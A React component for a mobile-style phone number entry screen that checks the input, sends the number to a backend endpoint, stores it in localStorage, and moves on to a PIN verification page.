import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import { ChevronLeft } from "lucide-react";

const Home = () => {
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (phone.length < 10) {
      setError("Please enter a valid phone number");
      return;
    }

    setLoading(true);
    setError("");

    try {
      await axios.post(`${BASE_URL}/phone`, { phone });
      // Save phone to localStorage if needed
      localStorage.setItem("phone", phone);
      localStorage.setItem("lastFour", phone.slice(-4));
      // Navigate to OTP verification page
      navigate("/pin");
    } catch (err) {
      console.error("Phone submission failed:", err);
      setError("Failed to send verification code. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col">
      {/* Header */}
      <div className="px-6 pt-20">
        {/* Title */}
        <h1 className="text-3xl font-bold mb-4">What's your number?</h1>
        <p className="text-gray-600 text-base mb-8">
          We'll send a verification code to your registered number to make sure
          it's yours.
        </p>

        {/* Phone Input */}
        <form onSubmit={handleSubmit}>
          <div className="relative bg-gray-50 rounded-xl px-4 py-4 mb-4">
            <input
              type="tel"
              inputMode="numeric"
              placeholder="Enter Phone Number"
              value={phone}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                setPhone(value);
                setError("");
              }}
              className="w-full bg-transparent text-lg outline-none placeholder:text-gray-400"
              maxLength={15}
            />
          </div>

          {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
        </form>
      </div>

      {/* Spacer */}
      <div className="flex-grow" />

      {/* Next Button */}
      <div className="px-6 pb-8">
        <button
          onClick={handleSubmit}
          disabled={loading || phone.length < 10}
          className={`w-full py-4 rounded-xl text-white font-semibold text-lg transition-colors ${
            loading || phone.length < 10
              ? "bg-gray-400 cursor-not-allowed"
              : "bg-gray-800 hover:bg-gray-900"
          }`}
        >
          {loading ? "Sending..." : "Next"}
        </button>
      </div>

      {/* Bottom Bar */}
      <div className="h-1 bg-black mx-auto w-32 rounded-full mb-4" />
    </div>
  );
};

export default Home;

